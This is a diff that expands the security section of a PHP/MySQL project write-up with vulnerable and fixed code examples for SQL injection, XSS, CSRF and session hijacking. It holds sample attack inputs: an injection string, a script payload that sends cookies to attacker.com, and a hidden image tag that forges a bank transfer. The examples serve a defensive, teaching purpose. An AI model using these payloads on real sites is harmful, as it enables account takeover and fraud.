@@ -269,8 +269,6 @@ Despite these disadvantages, PHP continues to evolve with regular language updat
 - Performance limitations compared to compiled languages.
 - Type safety issues in older versions (improved in PHP 7+).
 
-
-
 == MySQL
 
 MySQL stands as one of the most established and widely deployed relational database management systems in the world, powering countless applications from small personal websites to enterprise-level solutions. Its maturity in the market has created a robust ecosystem with comprehensive documentation, extensive community support, and a wealth of available expertise.
@@ -322,52 +320,113 @@ Despite these challenges, MySQL remains a solid choice for a wide range of appli
 - Less flexible than NoSQL databases for rapidly changing data structures.
 - Performance can degrade with very large datasets without proper optimization.
 
-== Security vulnerabilities and mitigations
+== Security Vulnerabilities and Mitigations
 
 === SQL Injection
 
-==== Vulnerability
-Raw SQL queries with unsanitized user input allow attackers to manipulate database queries.
+SQL injection occurs when raw SQL queries incorporate unsanitized user input, allowing attackers to manipulate database queries. This vulnerability can lead to unauthorized data access, data corruption, or even complete system compromise. Attackers exploit poorly constructed queries by injecting malicious SQL fragments that alter the query's intended behavior.
 
-==== Mitigation
-- Implemented prepared statements with parameter binding
-- Used PDO with parameterized queries
-- Applied input validation and sanitization
-- Limited database user privileges
+```php
+// Vulnerable code example
+$username = $_POST['username'];
+$query = "SELECT * FROM users WHERE username = '$username'";
+// Attacker input: admin' OR '1'='1
+// Results in: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+```
+
+Mitigations:
+
+- Prepared statements with parameter binding provide the most effective defense against SQL injection by separating SQL code from data. This approach ensures user input is treated strictly as parameter values rather than executable code.
+
+```php
+// Using PDO with parameterized queries
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);
+$user = $stmt->fetch();
+
+// Or with named parameters
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
+$stmt->execute(['username' => $username]);
+$user = $stmt->fetch();
+```
+
+- Input validation and sanitization provide an additional security layer by rejecting or cleaning suspicious input before processing. Limiting database user privileges according to the principle of least privilege ensures that even if an injection occurs, the potential damage remains constrained.
 
 === Cross-Site Scripting (XSS)
 
-==== Vulnerability
-Unsanitized user input rendered as HTML/JavaScript allows attackers to inject malicious scripts.
+XSS vulnerabilities arise when applications render unsanitized user input as HTML or JavaScript, enabling attackers to inject malicious scripts that execute in victims' browsers. These scripts can steal session cookies, redirect users to malicious sites, or manipulate page content.
 
-==== Mitigation
-- Applied context-appropriate output encoding (`htmlspecialchars()`)
-- Implemented Content Security Policy (CSP)
-- Used `HTTPOnly` cookies to prevent JavaScript access
-- Validated and sanitized all user inputs
+```html
+<!-- Vulnerable code -->
+<div>Welcome, <?php echo $_GET['name']; ?>!</div>
+<!-- Attacker input: <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script> -->
+```
+
+Mitigations:
+
+- Context-appropriate output encoding prevents browsers from interpreting special characters as code. Functions like `htmlspecialchars()` in PHP convert potentially dangerous characters to their HTML entity equivalents.
+
+```php
+// Proper output encoding
+<div>Welcome, <?php echo htmlspecialchars($_GET['name'], ENT_QUOTES); ?>!</div>
+```
+
+- Content Security Policy (CSP) headers restrict which resources browsers can load, providing defense-in-depth against script injection. HTTPOnly cookies prevent JavaScript access to sensitive cookies, thwarting many session theft attempts even if XSS occurs.
+
+```php
+// Setting CSP header
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+
+// Setting HTTPOnly cookie
+setcookie("session_id", $sessionId, $expiry, "/", "", true, true); // Last parameter enables HTTPOnly
+```
 
 === CSRF (Cross-Site Request Forgery)
 
-==== Vulnerability
+CSRF attacks exploit the trust that websites place in authenticated user browsers. Attackers craft pages that automatically submit requests to vulnerable sites, potentially triggering actions like password changes or fund transfers without user awareness.
 
-Attackers can trick users into performing unwanted actions on authenticated sessions.
+```html
+<!-- Malicious page on attacker.com -->
+<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">
+<!-- When visited by an authenticated user, triggers an unwanted transfer -->
+```
 
-==== Mitigation
-- Implemented unique CSRF tokens for forms
-- Validated token and origin on form submissions
-- Added SameSite cookie attributes
-- Required confirmation for sensitive operations
+Mitigations:
+
+- Unique CSRF tokens embedded in forms and validated on submission prevent automated cross-site requests. These tokens ensure that only forms legitimately generated by the application can submit valid requests.
+
+```php
+// Generate and store CSRF token
+$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+
+// Form with CSRF token
+<form method="post" action="/transfer">
+    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+    <!-- Form fields -->
+</form>
+
+// Validation on submission
+if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+    die("CSRF validation failed");
+}
+```
+
+- `SameSite` cookie attributes instruct browsers to include cookies only with requests originating from the same site, providing an additional layer of protection. Requiring confirmation for sensitive operations adds human verification that automated CSRF attacks cannot easily bypass.
 
 === Session Hijacking
 
-==== Vulnerability
-Attackers can steal or manipulate session identifiers to impersonate legitimate users.
+Session hijacking involves attackers obtaining or guessing valid session identifiers to impersonate legitimate users. This can occur through network sniffing, XSS attacks, or predictable session ID generation.
 
-==== Mitigation
-- Implemented secure session handling with session regeneration
-- Used HTTPS throughout the application
-- Applied proper session timeout controls
-- Implemented IP-based session validation for critical operations
+Mitigations:
+
+- Secure session handling with regular session regeneration reduces the window of opportunity for hijacking attempts. Generating new session IDs after authentication and significant privilege changes prevents attackers from using captured identifiers.
+
+```php
+// Regenerate session ID after login
+session_regenerate_id(true);
+```
+
+- HTTPS implementation throughout the application prevents network-level eavesdropping on session identifiers. Proper session timeout controls limit the lifetime of session identifiers, while IP-based validation for critical operations can detect suspicious location changes that might indicate hijacking.
 
 == SEO Optimization
 
